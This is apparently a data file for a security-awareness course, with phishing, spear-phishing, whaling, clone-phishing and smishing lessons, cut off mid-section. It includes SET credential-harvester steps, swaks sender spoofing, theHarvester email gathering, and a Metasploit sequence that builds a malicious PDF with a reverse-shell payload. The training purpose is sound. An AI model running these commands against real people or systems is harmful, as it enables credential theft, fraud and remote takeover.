            <h3 class="text-lg font-semibold mb-2 text-white">Common phishing characteristics</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Urgent or threatening language</li>
              <li>Requests for immediate action</li>
              <li>Suspicious links or attachments</li>
              <li>Fake sender addresses or domains</li>
              <li>Poor grammar or subtle inconsistencies</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Why phishing is effective</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Relies on trust and fear</li>
              <li>Bypasses firewalls and antivirus</li>
              <li>Targets humans, not systems</li>
              <li>Works across email, SMS, voice, and social media</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              A user receives an email claiming their bank account will be suspended. The link redirects to a fake login page that captures credentials.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Phishing Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Tools below are used for authorized security testing and awareness training only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to simulate phishing attacks and credential harvesting for awareness assessments.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start social engineering menu</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 1) Social-Engineering Attacks</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose phishing-based attacks</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 2) Website Attack Vectors</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Clone a website for phishing simulation</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: Credential Harvester Attack Method</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View captured credentials (authorized testing)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Gophish (Phishing Awareness Framework)</h4>
                  <p class="text-gray-300 mb-4">Used for controlled phishing campaigns and reporting.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start Gophish service</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">./gophish</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Check running process</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">ps aux | grep gophish</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Access admin interface (default)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">https://127.0.0.1:3333</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Change execution permissions if needed</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">chmod +x gophish</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View Gophish logs</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">cat logs/gophish.log</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Email Phishing Attacks',
        duration: '25 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Email Phishing Attacks</h2>
          <p class="mb-4 text-gray-300">
            Email phishing is the most common and widely used phishing technique where attackers send fraudulent emails that appear to come from legitimate organizations or trusted individuals. The goal is to trick recipients into clicking malicious links, opening infected attachments, or sharing sensitive information.
          </p>
          <p class="mb-4 text-gray-300">
            Email phishing attacks are effective because email is a primary communication channel in both personal and professional environments. Attackers exploit <span class="text-[#00bceb]">trust in brands, coworkers, banks, and service providers</span>.
          </p>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Common characteristics of email phishing</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Spoofed sender address or domain</li>
              <li>Urgent or threatening subject lines</li>
              <li>Malicious links disguised as legitimate URLs</li>
              <li>Infected attachments (PDF, DOC, ZIP, HTML)</li>
              <li>Requests for credentials, OTPs, or payments</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Types of email phishing</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Credential harvesting</h4>
                <p class="text-gray-300 text-sm">Emails designed to steal usernames and passwords via fake login pages.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Malware delivery</h4>
                <p class="text-gray-300 text-sm">Emails containing infected attachments that install malware or ransomware.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Invoice fraud</h4>
                <p class="text-gray-300 text-sm">Fake invoices requesting immediate payment to fraudulent accounts.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Account scams</h4>
                <p class="text-gray-300 text-sm">Warnings about account suspension requiring immediate verification.</p>
              </div>
            </div>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Why email phishing works</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Users skim emails quickly</li>
              <li>Visual similarity to real emails</li>
              <li>Email security filters can be bypassed</li>
              <li>Human error is unavoidable</li>
            </ul>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              An employee receives an email claiming to be from Microsoft IT asking them to re-login due to a “security update.” The link leads to a fake login page.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Email Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Tools below are used for authorized security testing and awareness training only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to simulate email-based phishing attacks in controlled environments.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Start social engineering attacks</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 1) Social-Engineering Attacks</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose phishing attack vectors</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Select: 5) Mass Mailer Attack</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Configure email template and payload</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                      <p class="text-sm text-gray-400 mt-1">Follow on-screen instructions</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Review sent email logs</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">ls -lah /root/.set/reports/</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Swaks (Swiss Army Knife for SMTP)</h4>
                  <p class="text-gray-300 mb-4">Used to test email delivery, spoofing awareness, and mail server behavior.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Send a basic test email</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">swaks --to user@target.com --from test@target.com --server mail.target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Spoof sender address (awareness testing)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">swaks --to user@target.com --from admin@target.com --server mail.target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Add a subject line</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">swaks --to user@target.com --from admin@target.com --subject "Security Alert" --server mail.target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Attach a file</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">swaks --to user@target.com --from admin@target.com --attach file.pdf --server mail.target.com</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View SMTP interaction in detail</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">swaks --to user@target.com --from admin@target.com --server mail.target.com --data "Test Email" -tls</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Spear Phishing',
        duration: '25 Minutes',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Spear Phishing Attacks</h2>
          <p class="mb-4 text-gray-300">
            Spear phishing is a highly targeted phishing attack aimed at a specific individual, role, or organization. Unlike generic phishing emails sent to thousands of users, spear phishing emails are custom-crafted using personal, professional, or organizational information gathered through <span class="text-[#00bceb]">OSINT (Open-Source Intelligence)</span>.
          </p>
          <p class="mb-4 text-gray-300">
            Attackers research their victims using social media, company websites, data breaches, and public documents. This personalization makes spear phishing much harder to detect and significantly increases success rates.
          </p>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Key differences between phishing and spear phishing</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li>Generic phishing targets everyone</li>
              <li>Spear phishing targets a specific person or department</li>
              <li>Messages are personalized and context-aware</li>
              <li>Often used in corporate espionage and financial fraud</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Common spear phishing targets</h3>
            <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
              <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] text-center text-gray-300 text-sm">HR managers</div>
              <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] text-center text-gray-300 text-sm">Finance teams</div>
              <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] text-center text-gray-300 text-sm">System administrators</div>
              <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] text-center text-gray-300 text-sm">Executives and CEOs</div>
              <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] text-center text-gray-300 text-sm">New employees</div>
            </div>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Attack flow</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300">
              <li>Information gathering (LinkedIn, GitHub, company site)</li>
              <li>Email impersonation (manager, vendor, IT support)</li>
              <li>Trust exploitation using real context</li>
              <li>Credential theft, malware delivery, or financial fraud</li>
            </ol>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <p class="text-gray-300">
              An attacker emails a finance executive pretending to be the CEO, referencing a real internal project, and requests an urgent wire transfer.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Spear Phishing',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in legal, authorized testing environments.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used for targeted phishing simulations.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Select Social Engineering Attacks</h5>
                      <p class="text-sm text-gray-400 mt-1">Option: 1</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Choose Spear-Phishing Attack Vectors</h5>
                      <p class="text-sm text-gray-400 mt-1">Option: 1</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Create email attack using credential harvester</h5>
                      <p class="text-sm text-gray-400 mt-1">Follow on-screen options</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Review captured credentials</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">theHarvester</h4>
                  <p class="text-gray-300 mb-4">Used to gather public information for spear phishing awareness and defense testing.</p>
                  
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Gather emails from a domain</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Use multiple data sources</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google,bing,duckduckgo</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Limit result count</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b google -l 100</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Save results to HTML</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b bing -f spear_report</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Search for employee names and subdomains</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">theHarvester -d target.com -b linkedin</code>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Whaling Attacks',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Whaling Attacks</h2>
          <p class="mb-4 text-gray-300">
            Whaling is an advanced form of spear phishing that specifically targets high-profile individuals such as CEOs, CFOs, directors, founders, and senior management. The goal is usually financial theft, sensitive data exposure, or strategic access.
          </p>
          <p class="mb-4 text-gray-300">
            Whaling attacks are carefully crafted using executive-level language, formal tone, and legitimate-looking email structures. Unlike regular phishing, these messages often avoid suspicious links and instead rely on authority, urgency, and trust.
          </p>
          
          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Why whaling attacks are dangerous</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li><span class="text-white font-medium">Executives have access to critical systems:</span> Compromising them grants high-level access.</li>
              <li><span class="text-white font-medium">Less technical scrutiny at leadership level:</span> Executives often bypass strict security controls for convenience.</li>
              <li><span class="text-white font-medium">High-value financial and legal data:</span> They handle sensitive company information.</li>
              <li><span class="text-white font-medium">Requests appear legitimate due to hierarchy:</span> Employees are less likely to question a CEO's request.</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Common whaling techniques</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Fake legal notices</h4>
                <p class="text-gray-300 text-sm">Subpoenas or lawsuits to induce panic and immediate action.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Urgent wire transfers</h4>
                <p class="text-gray-300 text-sm">Requests for immediate payment for "confidential" deals.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Confidential M&A emails</h4>
                <p class="text-gray-300 text-sm">Discussing secret mergers to gain trust and secrecy.</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Vendor payment changes</h4>
                <p class="text-gray-300 text-sm">Instructions to change bank details for large vendors.</p>
              </div>
            </div>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Attack flow</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300">
              <li>Research executive roles and communication style (OSINT).</li>
              <li>Impersonate board member, lawyer, or CEO.</li>
              <li>Create urgency and confidentiality to bypass verification.</li>
              <li>Extract money, credentials, or sensitive data.</li>
            </ol>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
            <p class="text-gray-300">
              A CFO receives an email from a “CEO” requesting an urgent confidential wire transfer for an acquisition deal. The email uses the CEO's typical phrasing and references a real, secret project (discovered via OSINT), causing the CFO to bypass standard approval channels.
            </p>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold mb-2 text-white">Key Takeaway</h3>
            <p class="text-gray-300">
              Whaling attacks succeed by exploiting authority and confidentiality. Executive awareness training and strict financial verification processes are critical defenses.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Whaling Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Tools below are used for authorized security training and simulations only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used for executive-level phishing simulations.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Spear-Phishing Attack</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">setoolkit</code>
                      <p class="text-sm text-gray-400 mb-2">Select 1) Social-Engineering Attacks -> 1) Spear-Phishing Attack Vectors</p>
                      <p class="text-sm text-gray-400">Customize email for executive impersonation using legitimate tone.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">View Reports</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Maltego</h4>
                  <p class="text-gray-300 mb-4">Used for executive OSINT and relationship mapping.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch Maltego</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">maltego</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Investigation Workflow</h5>
                      <ul class="list-disc pl-4 text-sm text-gray-400 space-y-1">
                        <li>New Graph → Blank Graph</li>
                        <li>Search executive email addresses (Email Address to Person transforms)</li>
                        <li>Identify domains and affiliations (Domain Owner transforms)</li>
                        <li>Map social media and relationships (Person to Social Media transforms)</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Clone Phishing',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Clone Phishing</h2>
          <p class="mb-4 text-gray-300">
            Clone phishing is a phishing technique where an attacker takes a legitimate email that was previously delivered and creates an almost identical copy, replacing the original attachment or link with a malicious one. Because the email looks familiar, victims are far more likely to trust it.
          </p>
          <p class="mb-4 text-gray-300">
            Attackers usually claim the original message had an issue and request the user to open the “updated” attachment or link.
          </p>
          
          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Why clone phishing is effective</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li><span class="text-white font-medium">Email looks familiar and expected:</span> Builds instant trust.</li>
              <li><span class="text-white font-medium">Sender appears legitimate:</span> Often uses spoofing or compromised accounts.</li>
              <li><span class="text-white font-medium">Victim has already interacted with similar content:</span> Lowers guard.</li>
              <li><span class="text-white font-medium">Reduces suspicion compared to fresh phishing emails:</span> It's a follow-up, not a cold call.</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Common clone phishing scenarios</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Updated invoice</h4>
                <p class="text-gray-300 text-sm">"Attached is the updated invoice with corrected details."</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Re-sending document</h4>
                <p class="text-gray-300 text-sm">"Re-sending the document with corrections as requested."</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Expired link</h4>
                <p class="text-gray-300 text-sm">"The previous link expired, please use this new one."</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Revised payroll</h4>
                <p class="text-gray-300 text-sm">"Here is the revised payroll document for your review."</p>
              </div>
            </div>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Attack flow</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300">
              <li>Obtain a legitimate email (compromised mailbox or forwarded mail).</li>
              <li>Clone email content, formatting, and subject line.</li>
              <li>Replace the original attachment or link with a malicious version.</li>
              <li>Deliver to the same recipient group (often with a "resending" excuse).</li>
              <li>Capture credentials or deliver malware upon interaction.</li>
            </ol>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
            <p class="text-gray-300">
              An employee receives an email identical to a previous HR message regarding policy updates. The subject line says "Updated Policy - Please Read", but the attachment installs a keylogger instead of opening a policy PDF.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Clone Phishing Simulation',
            content: `
              <div class="space-y-6">
                <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-4">
                  <p class="text-yellow-200 text-sm">⚠️ Note: Use only in authorized phishing simulations and security training.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Social Engineering Toolkit (SET)</h4>
                  <p class="text-gray-300 mb-4">Used to recreate legitimate-looking cloned emails.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Launch SET</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">setoolkit</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Configuration Steps</h5>
                      <ul class="list-disc pl-4 text-sm text-gray-400 space-y-1">
                        <li>Select 1) Social-Engineering Attacks</li>
                        <li>Select 1) Spear-Phishing Attack Vectors</li>
                        <li>Attach a cloned document or link (replace original carefully)</li>
                      </ul>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Review Results</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm">cat /root/.set/reports/*</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Metasploit Framework</h4>
                  <p class="text-gray-300 mb-4">Used to generate payloads embedded into cloned attachments (lab environment only).</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Generate Malicious PDF</h5>
                      <div class="space-y-1">
                        <code class="text-green-400 block font-mono text-sm">msfconsole</code>
                        <code class="text-green-400 block font-mono text-sm">use exploit/windows/fileformat/adobe_pdf_embedded_exe</code>
                        <code class="text-green-400 block font-mono text-sm">set PAYLOAD windows/meterpreter/reverse_tcp</code>
                        <code class="text-green-400 block font-mono text-sm">set LHOST 192.168.1.10</code>
                        <code class="text-green-400 block font-mono text-sm">set LPORT 4444</code>
                        <code class="text-green-400 block font-mono text-sm">exploit</code>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'SMS Phishing (Smishing)',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">SMS Phishing (Smishing)</h2>
          <p class="mb-4 text-gray-300">
            Smishing (SMS Phishing) is a phishing attack conducted through text messages instead of email. Attackers send fake SMS messages pretending to be banks, delivery services, telecom providers, government agencies, or even personal contacts.
          </p>
          <p class="mb-4 text-gray-300">
            Smishing is highly effective because people trust SMS more than email and often check messages immediately. Mobile devices also hide full URLs, making malicious links harder to detect.
          </p>
          
          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Why smishing is dangerous</h3>
            <ul class="list-disc pl-5 space-y-2 text-gray-300">
              <li><span class="text-white font-medium">SMS bypasses email security filters:</span> No spam folder for most SMS.</li>
              <li><span class="text-white font-medium">Short messages reduce scrutiny:</span> Less text means fewer clues to spot typos or odd grammar.</li>
              <li><span class="text-white font-medium">Mobile users act quickly:</span> Urgency leads to rash clicks.</li>
              <li><span class="text-white font-medium">Links redirect to phishing pages or malware:</span> Often using URL shorteners.</li>
            </ul>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Common smishing messages</h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Bank alert</h4>
                <p class="text-gray-300 text-sm">"Your bank account is blocked, verify now"</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Delivery failure</h4>
                <p class="text-gray-300 text-sm">"Package delivery failed, track here"</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Prize scam</h4>
                <p class="text-gray-300 text-sm">"You won a prize, claim now"</p>
              </div>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="font-semibold text-[#00bceb] mb-1">Security warning</h4>
                <p class="text-gray-300 text-sm">"Suspicious activity detected on your account"</p>
              </div>
            </div>
          </div>

          <div class="mb-6">
            <h3 class="text-lg font-semibold mb-3 text-white">Attack flow</h3>
            <ol class="list-decimal pl-5 space-y-2 text-gray-300">
              <li>Spoof sender ID or phone number (using SMS gateways).</li>
              <li>Create urgency or fear (blocked account, lost package).</li>
              <li>Insert shortened or disguised link (bit.ly, tinyurl).</li>
              <li>Redirect to phishing page or malware download.</li>
              <li>Capture credentials or install malicious apps.</li>
            </ol>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
            <h3 class="text-lg font-semibold mb-2 text-white">Real-world example</h3>
            <p class="text-gray-300">
              A victim receives an SMS claiming to be from a popular courier service stating a delivery fee is unpaid. The link leads to a fake tracking page that steals credit card details.
            </p>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tools for Smishing Simulation',
            content: `
